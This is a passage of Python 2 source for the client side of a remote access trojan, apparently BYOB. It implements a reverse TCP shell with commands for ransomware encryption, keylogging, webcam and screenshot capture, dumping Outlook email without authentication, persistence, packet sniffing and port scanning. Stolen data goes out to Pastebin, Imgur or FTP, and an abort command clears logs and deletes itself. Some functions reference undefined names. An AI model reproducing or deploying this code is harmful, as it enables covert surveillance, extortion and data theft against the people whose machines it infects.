            self.session.flags.alive.clear()
            self.session.flags.prompt.clear()
            self.session.connection.socket.close()
            for thread in self._threads:
                try:
                    self.stop(thread)
                except Exception as e:
                    Util.debug("{} error: {}".format(self.kill.func_name, str(e)))
        except Exception as e:
            Util.debug("{} error: {}".format(self.kill.func_name, str(e)))
    

    @config(platforms=['win32','linux2','darwin'], command=True, usage='help')
    def help(self, name=None):
        """
        Show usage help for commands and modules

        `Optional`
        :param str command:      name of a command or module
        """
        if not name:
            try:
                return help(self)
            except Exception as e:
                Util.debug("{} error: {}".format(self.help.func_name, str(e)))
        elif hasattr(self, name):
            try:
                return help(getattr(self, name))
            except Exception as e:
                Util.debug("{} error: {}".format(self.help.func_name, str(e)))
        else:
            return "'{}' is not a valid command and is not a valid module".format(name)


    @config(platforms=['win32','linux','darwin'], command=True, usage='mode <active/passive>')
    def mode(self, shell_mode):
        """
        Set mode of reverse TCP shell

          `Requires`
        :param str mode:     active, passive

          `Returns`
        :param str status:   shell mode status update 
        """
        try:
            if str(arg) == 'passive':
                self.session.flags.passive.set()
                return "Mode: passive"
            elif str(arg) == 'active':
                self.session.flags.passive.clear()
                return "Mode: active"
            else:
                return "Mode: passive" if self.session.flags.passive.is_set() else "Mode: active"
        except Exception as e:
            Util.debug(e)
        return self.mode.usage


    @config(platforms=['win32','linux2','darwin'], command=True, usage='abort')
    def abort(self):
        """
        Abort tasks, close connection, and self-destruct leaving no trace on the disk
        """
        self._abort = True
        try:
            if os.name is 'nt':
                Util.clear_system_logs()
            if 'persistence' in globals():
                for method in persistence.methods:
                    if persistence.methods[method].get('established'):
                        try:
                            remove = getattr(persistence, 'remove_{}'.format(method))()
                        except Exception as e2:
                            Util.debug("{} error: {}".format(method, str(e2)))
            if not _debug:
                Util.delete(sys.argv[0])
        finally:
            shutdown = threading.Thread(target=self.get_shutdown)
            taskkill = threading.Thread(target=self.ps, args=('kill python',))
            shutdown.start()
            taskkill.start()
            sys.exit()
 

    @config(platforms=['win32','linux2','darwin'], command=True, usage='stop <job>')
    def stop(self, target):
        """
        Stop a running job
        """
        try:
            if target in self._threads:
                _ = self._threads.pop(target, None)
                del _
                return "Job '{}' was stopped.".format(target)
            else:
                return "Job '{}' not found".format(target)
        except Exception as e:
            Util.debug("{} error: {}".format(self.stop.func_name, str(e)))


    @config(platforms=['win32','linux2','darwin'], command=True, usage='show <value>')
    def show(self, attribute):
        """
        Show value of an attribute
        """
        try:
            attribute = str(attribute)
            if 'jobs' in attribute:
                return json.dumps({a: status(_threads[a].name) for a in self._threads if self._threads[a].is_alive()})
            elif 'privileges' in attribute:
                return json.dumps({'username': self.system.get('username'),  'administrator': 'true' if bool(os.getuid() == 0 if os.name is 'posix' else ctypes.windll.shell32.IsUserAnAdmin()) else 'false'})
            elif 'info' in attribute:
                return json.dumps(self.system)
            elif hasattr(self, attribute):
                try:
                    return json.dumps(getattr(self, attribute))
                except:
                    try:
                        return json.dumps(vars(getattr(self, attribute)))
                    except: pass
            elif hasattr(self, str('_%s' % attribute)):
                try:
                    return json.dumps(getattr(self, str('_%s' % attribute)))
                except:
                    try:
                        return json.dumps(vars(getattr(self, str('_%s' % attribute))))
                    except: pass
            else:
                return self.show.usage
        except Exception as e:
            Util.debug("'{}' error: {}".format(_threads.func_name, str(e)))


    @config(platforms=['win32','linux2','darwin'], command=True, usage='unzip <file>')
    def unzip(self, path):
        """
        Unzip a compressed archive/file

          `Required`
        :param str path:    target .zip archive
        """
        if os.path.isfile(path):
            try:
                _ = zipfile.ZipFile(path).extractall('.')
                return os.path.splitext(path)[0]
            except Exception as e:
                Util.debug("{} error: {}".format(self.unzip.func_name, str(e)))
        else:
            return "File '{}' not found".format(path)


    @config(platforms=['win32','linux2','darwin'], command=True, usage='sms <send/read> [args]')
    def phone(self, args):
        """
        Use an online phone to send text messages

        `Required`
           :param str phone:     recipient phone number
           :param str message:   text message to send
        
        `Optional`
           :param str account:   Twilio account SID 
           :param str token:     Twilio auth token 
           :param str api:       Twilio api key
        """
        if 'phone' not in globals():
            phone = Util.remote_import('phone')
        mode, _, args = str(args).partition(' ')
        if 'text' in mode:
            phone_number, _, message = args.partition(' ')
            return phone.text_message(phone_number, message)
        else:
            return 'usage: <send/read> [args]\n  arguments:\n\tphone    :   phone number with country code - no spaces (ex. 18001112222)\n\tmessage :   text message to send surrounded by quotes (ex. "example text message")'


    @config(platforms=['win32','linux2','darwin'], command=False)
    def imgur(self, source):
        """
        Upload image file/data to Imgur

        `Required`
          :param str source:    data or filename
        """
        try:
            key = self.api.get('imgur')
            if key and isinstance(key, list):
                if len(key) == 1:
                    api  = 'Client-ID {}'.format(key[0])
                    data = Util.normalize(source)
                    post = Util.post('https://api.imgur.com/3/upload', headers={'Authorization': api}, data={'image': base64.b64encode(data), 'type': 'base64'})
                    return str(json.loads(post)['data']['link'])
                else:
                    return "Error: use only 1 Imgur API key at a time"
            else:
                return "No Imgur API Key found"
        except Exception as e2:
            return "{} error: {}".format(self.imgur.func_name, str(e2))

      
    @config(platforms=['win32','linux2','darwin'], command=True, usage='upload <mode> [file]')
    def upload(self, args):
        """
        Upload file to an FTP server, Imgur, or Pastebin

        `Required`
        :param str mode:      ftp, imgur, pastebin
        :param str source:    data or filename
        """
        try:
            mode, _, source = str(args).partition(' ')
            if not source:
                return self.upload.usage + ' -  mode: ftp, imgur, pastebin'
            elif mode not in ('ftp','imgur','pastebin'):
                return self.upload.usage + ' - mode: ftp, imgur, pastebin'
            else:
                return getattr(self, mode)(source)
        except Exception as e:
            Util.debug("{} error: {}".format(self.upload.func_name, str(e)))


    @config(platforms=['win32','linux2','darwin'], registry_key=r"Software\BYOB", command=True, usage='ransom <mode> [path]')
    def ransom(self, args):
        """
        Ransom personal files on the client host machine using encryption

          `Required`
        :param str mode:    encrypt, decrypt, payment
        :param str target:  target filename or directory path
        """
        if 'ransom' not in globals():
            ransom = Util.remote_import('ransom')
        elif not args:
            return self.ransom.usage
        else:
            cmd, _, action = str(args).partition(' ')
            if 'payment' in cmd:
                try:
                    return ransom.payment(action)
                except:
                    return "{} error: {}".format(shell._ransom_payment.func_name, "bitcoin wallet required for ransom payment")
            elif 'decrypt' in cmd:
                return ransom.decrypt_threader(action)
            elif 'encrypt' in cmd:
                reg_key = _winreg.CreateKey(_winreg.HKEY_CURRENT_USER, registry_key)
                return ransom.encrypt_threader(action)
            else:
                return self.ransom.usage

            
    @config(platforms=['win32','linux2','darwin'], command=True, usage='webcam <mode> [options]')
    def webcam(self, args=None):
        """
        View a live stream of the client host machine webcam or capture image/video

        `Required`
        :param str mode:      stream, image, video

        `Optional`
        :param str upload:    imgur, ftp
        :param int port:      integer 1 - 65355 (stream mode only)
        """
        try:
            if 'webcam' not in globals():
                webcam = Util.remote_import('webcam')
            elif not args:
                result = self.webcam.usage
            else:
                args = str(args).split()
                if 'stream' in args:
                    if len(args) != 2:
                        result = "Error - stream mode requires argument: 'port'"
                    elif not str(args[1]).isdigit():
                        result = "Error - port must be integer between 1 - 65355"
                    else:
                        result = webcam.stream(port=args[1])
                else:
                    result = webcam.image(*args) if 'video' not in args else webcam.video(*args)
        except Exception as e:
            result = "{} error: {}".format(self.webcam.func_name, str(e))
        return result
    

    @config(platforms=['win32','linux2','darwin'], command=True, usage='restart [output]')
    def restart(self, output='connection'):
        """
        Restart the shell
        """
        try:
            Util.debug("{} failed - restarting in 3 seconds...".format(output))
            self.kill()
            time.sleep(3)
            os.execl(sys.executable, 'python', os.path.abspath(sys.argv[0]), *sys.argv[1:])
        except Exception as e:
            Util.debug("{} error: {}".format(self.restart.func_name, str(e)))


    @config(platforms=['win32','darwin'], command=True, usage='outlook <option> [mode]')
    def outlook(self, args=None):
        """
        Access Outlook email in the background without authentication

        `Required`
        :param str mode:    count, dump, search, results

        `Optional`
        :param int n:       target number of emails (upload mode only)
        """
        if 'outlook' not in globals():
            outlook = Util.remote_import('outlook')
        elif not args:
            try:
                if not outlook.installed():
                    return "Error: Outlook not installed on this host"
                else:
                    return "Outlook is installed on this host"
            except: pass
        else:
            try:
                mode, _, arg   = str(args).partition(' ')
                if hasattr(outlook % mode):
                    if 'dump' in mode or 'upload' in mode:
                        self._threads['outlook'] = threading.Thread(target=getattr(outlook, mode), kwargs={'n': arg}, name=time.time())
                        self._threads['outlook'].daemon = True
                        self._threads['outlook'].start()
                        return "Dumping emails from Outlook inbox"
                    elif hasattr(outlook, mode):
                        return getattr(outlook, mode)()
                    else:
                        return "Error: invalid mode '%s'" % mode
                else:
                    return "usage: outlook [mode]\n    mode: count, dump, search, results"
            except Exception as e:
                Util.debug("{} error: {}".format(self.email.func_name, str(e)))


    @config(platforms=['win32','linux2','darwin'], process_list={}, command=True, usage='execute <path> [args]')
    def execute(self, args):
        """
        Run an executable program in a hidden process

        `Required`
        :param str path:    file path of the target program

        `Optional`
        :param str args:    arguments for the target program
        """
        path, args = [i.strip() for i in args.split('"') if i if not i.isspace()] if args.count('"') == 2 else [i for i in args.partition(' ') if i if not i.isspace()]
        args = [path] + args.split()
        if os.path.isfile(path):
            name = os.path.splitext(os.path.basename(path))[0]
            try:
                info = subprocess.STARTUPINFO()
                info.dwFlags = subprocess.STARTF_USESHOWWINDOW ,  subprocess.CREATE_NEW_ps_GROUP
                info.wShowWindow = subprocess.SW_HIDE
                self.execute.process_list[name] = subprocess.Popen(args, startupinfo=info)
                return "Running '{}' in a hidden process".format(path)
            except Exception as e:
                try:
                    self.execute.process_list[name] = subprocess.Popen(args, 0, None, None, subprocess.PIPE, subprocess.PIPE)
                    return "Running '{}' in a new process".format(name)
                except Exception as e:
                    Util.debug("{} error: {}".format(self.execute.func_name, str(e)))
        else:
            return "File '{}' not found".format(str(path))


    @config(platforms=['win32'], buffer=cStringIO.StringIO(), max_bytes=1024, command=True, usage='process <mode>s')
    def process(self, args=None):
        """
        Utility method for interacting with processes

        `Required`
        :param str mode:    block, list, monitor, kill, search

        `Optional`
        :param str args:    arguments specific to the mode
        """
        try:
            if 'process' not in globals():
                process = Util.remote_import('process')
            elif not args:
                return self.ps.usage
            else:
                cmd, _, action = str(args).partition(' ')
                if hasattr(process, cmd):
                    return getattr(process, cmd)(action) if action else getattr(process, cmd)()
                else:
                    return "usage: {}\n\tmode: block, list, search, kill, monitor\n\t".format(self.ps.usage)
        except Exception as e:
            Util.debug("{} error: {}".format(self.process.func_name, str(e)))


    @config(platforms=['win32','linux2','darwin'], command=True, usage='portscan <target>')
    def portscan(self, args):
        """
        Scan a target host or network to identify 
        other target hosts and open ports.

        `Required`
        :param str mode:        host, network
        :param str target:      IPv4 address
        """
        if 'portscan' not in globals():
            portscan = Util.remote_import('portscan')
        try:
            mode, _, target = str(args).partition(' ')
            if target:
                if not Util.ipv4(target):
                    return "Error: invalid IP address '%s'" % target
            else:
                target = socket.gethostbyname(socket.gethostname())
            if hasattr(portscan, mode):
                return getattr(portscan, mode)(target)
            else:
                return "Error: invalid mode '%s'" % mode
        except Exception as e:
            Util.debug("{} error: {}".format(self.portscan.func_name, str(e)))
            

    def pastebin(self, source, dev_key=None, user_key=None):
        """
        Dump file/data to Pastebin

        `Required`
        :param str source:      data or filename

        `Optional`
        :param str api_key:     Pastebin api_dev_key  (default: Shell.api.pastebin.api_key)
        :param str user_key:    Pastebin api_user_key (default: None)
        """
        try:
            if hasattr(self.api, 'pastebin'):
                api_dev_key  = None
                api_user_key = None
                info = {'api_option': 'paste', 'api_paste_code': Util.normalize(source)}
                keys = self.api.pastebin
                if hasattr(self.api.pastebin, 'dev_key'):
                    info.update({'api_dev_key': self.api.pastebin.dev_key})
                if hasattr(self.api.pastebin, 'user_key'):
                    info.update({'api_user_key': self.api.pastebin.user_key})
                paste = Util.post('https://pastebin.com/api/api_post.php',data=info)        
                return '{}/raw/{}'.format(os.path.split(paste)[0], os.path.split(paste)[1]) if paste.startswith('http') else paste
            else:
                return "{} error: no pastebin API key".format(self.pastebin.func_name)
        except Exception as e:
            return '{} error: {}'.format(self.pastebin.func_name, str(e))


    @config(platforms=['win32','linux2','darwin'], max_bytes=4000, buffer=cStringIO.StringIO(), window=None, command=True, usage='keylogger start/stop/dump/status')
    def keylogger(self, mode=None):
        """
        Log user keystrokes

        `Required`
        :param str mode:     run, stop, status, upload, auto
        """
        def status():
            try:
                mode    = 'stopped'
                if 'keylogger' in self._threads:
                    mode= 'running'
                update  = Util.status(float(self._threads.get('keylogger').name))
                length  = keylogger._buffer.tell()
                return "Status\n\tname: {}\n\tmode: {}\n\ttime: {}\n\tsize: {} bytes".format(func_name, mode, update, length)
            except Exception as e:
                Util.debug("{} error: {}".format('keylogger.status', str(e)))
        if 'keylogger' not in globals():
            keylogger = Util.remote_import('keylogger')
        elif not mode:
            if 'keylogger' not in self._threads:
                return keylogger.usage
            else:
                return status()      
        else:
            if 'run' in mode or 'start' in mode:
                if 'keylogger' not in self._threads:
                    self._threads['keylogger'] = keylogger.run()
                    return status()
                else:
                    return status()
            elif 'stop' in mode:
                try:
                    self.stop('keylogger')
                except: pass
                try:
                    self.stop('keylogger')
                except: pass
                return status()
            elif 'auto' in mode:
                self._threads['keylogger'] = keylogger.auto()
                return status()
            elif 'upload' in mode:
                result = pastebin(keylogger._buffer) if not 'ftp' in mode else ftp(keylogger._buffer)
                keylogger.buffer.reset()
                return result
            elif 'status' in mode:
                return status()        
            else:
                return keylogger.usage + '\n\targs: start, stop, dump'

            
    @config(platforms=['win32','linux2','darwin'], command=True, usage='screenshot <mode>')
    def screenshot(mode=None):
        """
        Capture a screenshot from host device

        `Modes`:
            ftp
            imgur

        `Optional`
        :param str mode:   screenshot upload mode (default: None)
        """
        try:
            if 'screenshot' not in globals():
                screenshot = Util.remote_import('screenshot')
            elif not mode in ('ftp','imgur'):
                return "Error: invalid mode '%s'" % str(mode)
            else:
                return screenshot.screenshot(mode)
        except Exception as e:
            Util.debug("{} error: {}".format(self.screenshot.func_name, str(e)))
    

    @config(platforms=['win32','linux2','darwin'], command=True, usage='persistence add/remove [method]')
    def persistence(self, args=None):
        """
        Establish persistence on client host machine

        `Methods`: 
            registry key
            scheduled task
            launch agent
            crontab job
            startup file
            hidden file

        `Optional`
        :param str method:  persistence method to use (default: all)
        """
        try:
            if not 'persistence' in globals():
                persistence = Util.remote_import('persistence')
            if not args:
                return self.persistence.usage
            else:
                cmd, _, action = str(args).partition(' ')
                methods = [m for m in persistence.methods if sys.platform in persistence.methods[m]['platforms']]
                if cmd not in ('add','remove'):
                    return self.persistence.usage + str('\nmethods: %s' % ', '.join([str(m) for m in persistence.methods if sys.platform in getattr(shell, '_persistence_add_%s' % m).platforms]))
                for method in methods:
                    if method == 'all' or action == method:
                        persistence.methods[method]['established'], persistence.methods[method]['result'] = getattr(self, '_'.join(cmd, method))()
                return json.dumps({m: persistence.methods[m]['result'] for m in methods})
        except Exception as e:
            Util.debug("{} error: {}".format(self.persistence.func_name, str(e)))
        return str(self.persistence.usage + '\nmethods: %s' % ', '.join([m for m in persistence.methods if sys.platform in getattr(shell, '_persistence_add_%s' % m).platforms]))


    @config(platforms=['linux2','darwin'], capture=[], command=True, usage='packetsniffer mode=[str] time=[int]')
    def packetsniffer(self, args):
        """
        Capture traffic on local network
        """
        try:
            if 'packetsniffer' not in globals():
                packetsniffer = Util.remote_import('packetsniffer')
            mode = None
            length = None
            cmd, _, action = str(args).partition(' ')
            for arg in action.split():
                if arg.isdigit():
                    length = int(arg)
                elif arg in ('ftp','pastebin'):
                    mode = arg
            self._threads['packetsniffer'] = packetsniffer(mode, seconds=length)
            return 'Capturing network traffic for {} seconds'.format(duration)
        except Exception as e:
            Util.debug("{} error: {}".format(self.packetsniffer.func_name, str(e)))


    def remote_import(self, modules):
        """
        Directly import a module/package remotely from a server 

        `Required`
        :param list/str modules:  list (or comma-separated string) of module names to import remotely
        """
        host, port = self.session.connection.socket.getpeername()
        if isinstance(modules, str):
            modules = modules.split(',')
        if isinstance(modules, list):
            for module in modules:
                if module in Shell._modules:
                    with Util.remote_repo(Shell._modules, 'http://{}:{}'.format(host, port + 3)):
                        try:
                            exec "import %s" % module in self.modules
                        except ImportError as e:
                            Util.debug(e)
                elif module in Shell._packages:
                    with Util.remote_repo(Shell._packages, 'http://{}:{}'.format(host, port + 2)):
                        try:
                            exec "import %s" % module in globals()
                            sys.modules[module] = globals()[module]
                        except ImportError as e:
                            Util.debug(e)
                else:

                    if pkgs:

                        try:
                            exec "import %s" % module in globals()
                            sys.modules[module] = globals()[module]
                        except ImportError as e:
                            Util.debug(e)


    @threaded
    def run(self):
        """
        Connect back to server via outgoing connection
        and initialize a reverse TCP shell

        Returns threading.Thread object
        """
        try:
            for package in Shell.packages:
                if package not in globals():
                    self.remote_import(package)
            for target in ('_prompt_handler','_thread_handler'):
                if not bool(target in self._threads or self._threads[target].is_alive()):
                    self._threads[target] = getattr(self, target)
            while True:
                if self.session.flags.alive.wait(timeout=1.0):
                    if not self.session.flags.prompt.is_set():
                        task = self.session.recv_task()
                        if isinstance(task, dict):
                            cmd, _, action = task.command.encode().partition(' ')
                            try:
                                if cmd in dir(self.commands):
                                    result = bytes(getattr(self.commands, cmd)(action) if action else getattr(self.commands, cmd)())
                                else:
                                    result = bytes().join(subprocess.Popen(cmd, 0, None, subprocess.PIPE, subprocess.PIPE, subprocess.PIPE, shell=True).communicate())
                            except Exception as e:
                                result  = "{} error: {}".format(self.run.func_name, str(e))
                            task.update({'result': result})
                            self.session.send_task(Util.task(**task))
                        self.session.flags.prompt.set()
                else:
                    Util.debug("Connection timed out")
                    break
        except Exception as e:
            Util.debug("{} error: {}".format(self.run.func_name, str(e)))


